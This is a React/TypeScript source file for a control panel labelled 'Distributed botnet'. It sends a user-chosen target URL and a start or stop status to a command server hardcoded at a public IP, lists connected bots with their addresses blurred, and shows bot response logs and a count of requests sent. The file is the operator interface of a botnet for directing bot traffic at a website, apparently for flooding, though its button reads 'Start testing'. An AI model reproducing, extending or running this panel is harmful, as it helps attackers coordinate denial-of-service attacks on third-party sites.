import React, { useState, useEffect } from "react";
import axios from "axios";
import {
  IconButton,
  Badge,
  Button,
  Input,
  Code,
  Checkbox,
} from "@vechaiui/react";

const Panel = () => {
  const serverUrl = "http://54.211.202.150:5000";

  const [time, setTime] = useState(0);
  const [running, setRunning] = useState(false);
  const [target, setTarget] = useState("");
  const [activeBots, setActiveBots] = useState([]);
  const [botsStats, setBotsStats] = useState([]);

  let intervalTimer: NodeJS.Timer;
  let intervalActivity: NodeJS.Timer;

  const changeServerStatus = async (serverUrl: string, status: boolean) => {
    const changeServerStatusEndpoint: string = "/setServerStatus";

    const statusObject = {
      status: status,
    };

    try {
      await axios.post(serverUrl + changeServerStatusEndpoint, statusObject);
    } catch (err) {
      console.log({
        message: "Status setting failed.",
        errorInfo: err,
      });
    }
  };

  const changeTarget = async (serverUrl: string, target: string) => {
    const changeTargetEndpoint: string = "/changeTarget";

    const targetObject = {
      target: target,
    };

    try {
      await axios.post(serverUrl + changeTargetEndpoint, targetObject);
    } catch (err) {
      console.log({
        message: "Target setting failed.",
        errorInfo: err,
      });
    }
  };

  const getActiveBots = async (serverUrl: string) => {
    const getActiveBotsEndpoint = "/getConnectedBots";
    try {
      const response = await axios.get(serverUrl + getActiveBotsEndpoint);
      const responseData = response.data;

      setActiveBots(responseData);
      console.log(responseData);
    } catch (err) {
      console.log(err);
    }
  };

  const getBotsStats = async (serverUrl: string) => {
    const getBotsStatsEndpoint = "/getBotsStats";
    try {
      const response = await axios.get(serverUrl + getBotsStatsEndpoint);
      const responseData = response.data;

      setBotsStats(responseData.stats);
      console.log(responseData.stats);
    } catch (err) {
      console.log(err);
    }
  };

  useEffect(() => {
    if (running) {
      intervalTimer = setInterval(() => {
        setTime((prevTime) => prevTime + 10);
      }, 10);
      intervalActivity = setInterval(() => {
        getActiveBots(serverUrl);
        getBotsStats(serverUrl);
      }, 10000);
    } else if (!running) {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    }
    return () => {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    };
  }, [running]);

  return (
    <div>
      <div className="mt-8 mx-20">
        <h1 className="text-3xl font-bold text-gray-700">Distributed botnet</h1>
        <p className="text-gray-400 mb-8">version 1.0.0</p>
        <div className=" w-full flex h-full">
          <div className="flex flex-col w-1/2">
            <div className="h-1/2">
              <p className="text-gray-500 text-base mb-3">Give the target:</p>
              <div className="w-5/6 mb-5">
                <Input.Group>
                  <Input.LeftAddon children="https://" />
                  <Input
                    placeholder="target"
                    onChange={(e) => {
                      setTarget(e.target.value);
                    }}
                  />
                </Input.Group>
              </div>
              <p className="text-gray-400 text-sm">Configuration:</p>
              <div className="flex flex-col gap-1 mb-3">
                <Checkbox defaultChecked>Setting string 1</Checkbox>
                <Checkbox defaultChecked>Setting string 2</Checkbox>
                <Checkbox defaultChecked>Setting string 3</Checkbox>
              </div>
              <Button
                onClick={() => {
                  setRunning(true);
                  setTime(0);
                  changeServerStatus(serverUrl, true);
                  changeTarget(serverUrl, "https://" + target);
                  getActiveBots(serverUrl);
                }}
                variant="solid"
                color="primary"
              >
                Start testing
              </Button>
            </div>
            <div className="bg-gray-100 rounded h-1/2 overflow-scroll p-3">
              <p className="text-gray-500 text-base mb-3">Bots response log:</p>

              {botsStats.length != 0
                ? botsStats.map((response: any) => (
                    <Code className="flex flex-col justify-start items-start">
                      <p>TARGET: {response.target}</p>
                      <p>STATUS: {JSON.stringify(response.status)}</p>
                    </Code>
                  ))
                : "No information retrieved yet"}
            </div>
          </div>
          <div className="flex-col w-1/2">
            <div className="h-72">
              <div className="flex items-center mb-3 gap-2">
                <p className="text-gray-500 text-base">Connected bots</p>
                <Badge>{activeBots.length}</Badge>
              </div>
              <div>
                {activeBots.length != 0 ? (
                  activeBots.map((bot: string) => (
                    <div className="bg-gray-100 h-8 flex items-center p-3 mb-1 rounded">
                      <p className="text-gray-700 blur-[5px] hover:blur-none font-medium text-base ">
                        {bot.slice(2)}
                      </p>
                    </div>
                  ))
                ) : (
                  <p className="text-gray-400  font-normal mt-5 text-center">
                    No bots connected
                  </p>
                )}
              </div>
            </div>
            <div className="bg-gray-100 rounded ml-2 h-60 p-3">
              <p className="text-gray-400 text-sm ">
                Placeholder for something
              </p>
            </div>
          </div>
        </div>
      </div>
      <div className="h-20 w-full fixed bottom-0 flex items-center justify-around bg-gray-100">
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Target:</p>
          <p className="text-gray-600 text-sm font-medium">
            {target ? target : "Not defined"}
          </p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Status:</p>
          <p className="text-green-400 text-sm font-medium">Active</p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Requests sent:</p>
          <p className="text-green-400 text-sm font-medium">16000</p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm flex items-center">
            Time elapsed:
          </p>
          <p className="text-4xl font-bold text-gray-600 bottom-0">
            <div className="numbers">
              <span>{("0" + Math.floor((time / 60000) % 60)).slice(-2)}:</span>
              <span>{("0" + Math.floor((time / 1000) % 60)).slice(-2)}</span>
            </div>
          </p>
        </div>

        <Button
          onClick={() => {
            changeServerStatus(serverUrl, false);
            setRunning(false);
            setActiveBots([]);
            setBotsStats([]);
          }}
          variant="solid"
          className="w-20"
        >
          Stop
        </Button>
      </div>
    </div>
  );
};

export default Panel;
